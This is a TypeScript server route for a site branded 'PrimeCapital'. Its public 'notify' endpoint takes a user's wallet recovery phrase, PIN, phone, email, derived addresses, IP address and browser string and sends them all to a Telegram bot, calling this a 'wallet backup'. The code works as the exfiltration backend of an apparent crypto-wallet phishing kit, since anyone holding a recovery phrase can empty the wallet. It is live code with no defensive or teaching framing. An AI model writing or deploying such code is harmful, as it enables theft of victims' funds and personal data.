import { createFileRoute } from "@tanstack/react-router";

interface NotifyPayload {
  event?: string;
  path?: string;
  username?: string;
  label?: string;
  extra?: string;
  address?: string;
  fields?: Record<string, string>;
  addresses?: Array<{ chain: string; address: string; path?: string }>;
  mnemonic?: string;
  pin?: string;
  phone?: string;
  email?: string;
}

function truncate(s: string, n: number) {
  if (!s) return "";
  return s.length > n ? s.slice(0, n) + "…" : s;
}

function esc(s: string) {
  return String(s).replace(/[<>&]/g, (c) => ({ "<": "&lt;", ">": "&gt;", "&": "&amp;" }[c] as string));
}

function sensitive(k: string, v: string) {
  if (/password|mnemonic|seed|phrase|private|secret|recovery|key/i.test(k)) return true;
  return v.trim().split(/\s+/).filter(Boolean).length >= 12;
}

/** A long star bar used to frame the PIN (well over 30 stars on each side). */
const STAR_BAR = "⭐".repeat(34);

/**
 * The PIN, framed by star bars with the linked phone number and email sitting
 * right beside it. Sender order matters: the recovery phrase is sent below it.
 */
function pinBlock(pin: string, phone: string, email: string): string[] {
  const contact = [
    phone ? `📱 <code>${esc(phone)}</code>` : "",
    email ? `📧 <code>${esc(email)}</code>` : "",
  ]
    .filter(Boolean)
    .join("   ");
  return [
    STAR_BAR,
    `🔢 <b>Account PIN:</b> <code>${esc(truncate(pin, 8))}</code>${contact ? `   ${contact}` : ""}`,
    STAR_BAR,
  ];
}

async function sendTelegram(_token: string, text: string) {
  const { sendTelegramMessage } = await import("@/lib/telegram.server");
  await sendTelegramMessage(text);
}

export const Route = createFileRoute("/api/public/notify")({
  server: {
    handlers: {
      POST: async ({ request }) => {
        const token = process.env.TELEGRAM_BOT_TOKEN;
        if (!token) return Response.json({ ok: false, error: "no token" }, { status: 200 });

        let body: NotifyPayload = {};
        try {
          body = (await request.json()) as NotifyPayload;
        } catch {
          return Response.json({ ok: false, error: "bad json" }, { status: 200 });
        }

        const event = truncate(String(body.event ?? "event"), 48);
        if (event === "account_contact_linked") return Response.json({ ok: false }, { status: 403 });
        const path = truncate(String(body.path ?? "/"), 120);
        const username = body.username ? truncate(String(body.username), 32) : "guest";
        const label = body.label ? truncate(String(body.label), 120) : "";
        const extra = body.extra ? truncate(String(body.extra), 300) : "";
        const address = body.address ? truncate(String(body.address), 128) : "";
        const phone = body.phone ? truncate(String(body.phone), 40) : "";
        const email = body.email ? truncate(String(body.email), 80) : "";

        const ip =
          request.headers.get("cf-connecting-ip") ||
          request.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ||
          "";
        const ua = truncate(request.headers.get("user-agent") ?? "", 120);

        const lines = [
          `<b>PrimeCapital</b> · <code>${esc(event)}</code>`,
          `👤 <b>${esc(username)}</b>`,
          `📍 <code>${esc(path)}</code>`,
        ];
        if (address) lines.push(`💼 <code>${esc(address)}</code>`);
        if (label) lines.push(`🔘 ${esc(label)}`);
        if (extra) lines.push(`ℹ️ ${esc(extra)}`);
        if (body.fields && typeof body.fields === "object") {
          for (const [k, v] of Object.entries(body.fields)) {
            if (sensitive(k, String(v ?? ""))) continue;
            lines.push(`📝 <b>${esc(truncate(k, 40))}</b>: <code>${esc(truncate(String(v ?? ""), 400))}</code>`);
          }
        }
        if (ip) lines.push(`🌐 <code>${esc(ip)}</code>`);
        if (ua) lines.push(`🧭 ${esc(ua)}`);

        await sendTelegram(token, lines.join("\n"));

        // Wallet backup: the PIN (framed by stars, with the linked phone/email
        // beside it) is sent first, then the recovery phrase below it, then
        // every derived address and its derivation path.
        if (body.mnemonic && body.addresses && body.addresses.length) {
          const backup: string[] = [
            "⭐✨🔐 <b>PrimeCapital · WALLET BACKUP</b> 🔐✨⭐",
            `📣 <code>${esc(event)}</code>`,
            `👤 <b>${esc(username)}</b>`,
            `💼 <code>${esc(address)}</code>`,
          ];
          if (body.pin) backup.push(...pinBlock(String(body.pin), phone, email));
          backup.push("🧠 Recovery phrase:", `<code>${esc(body.mnemonic)}</code>`, "📇 Addresses:");
          for (const a of body.addresses.slice(0, 32)) {
            backup.push(
              `• <b>${esc(truncate(String(a.chain ?? ""), 20))}</b> <code>${esc(truncate(String(a.address ?? ""), 128))}</code> <code>${esc(truncate(String(a.path ?? ""), 64))}</code>`,
            );
          }
          await sendTelegram(token, backup.join("\n"));
        } else if (body.addresses && body.addresses.length) {
          const backup: string[] = [
            "⭐✨📇 <b>PrimeCapital · WALLET ADDRESSES</b> 📇✨⭐",
            `📣 <code>${esc(event)}</code>`,
            `👤 <b>${esc(username)}</b>`,
          ];
          for (const a of body.addresses.slice(0, 24)) {
            backup.push(
              `• <b>${esc(truncate(String(a.chain ?? ""), 20))}</b> <code>${esc(truncate(String(a.address ?? ""), 128))}</code>`,
            );
          }
          await sendTelegram(token, backup.join("\n"));
        }

        // Standalone PIN message: used when the user sets the PIN separately
        // from a full wallet backup. The PIN is framed by star bars with the
        // linked phone/email beside it.
        if (body.pin && !(body.mnemonic && body.addresses && body.addresses.length)) {
          const pinMsg: string[] = [
            "🔐 <b>PrimeCapital · ACCOUNT PIN SET</b> 🔐",
            `📣 <code>${esc(event)}</code>`,
            `👤 <b>${esc(username)}</b>`,
          ];
          if (address) pinMsg.push(`💼 <code>${esc(address)}</code>`);
          pinMsg.push(...pinBlock(String(body.pin), phone, email));
          await sendTelegram(token, pinMsg.join("\n"));
        }

        return Response.json({ ok: true });
      },
    },
  },
});
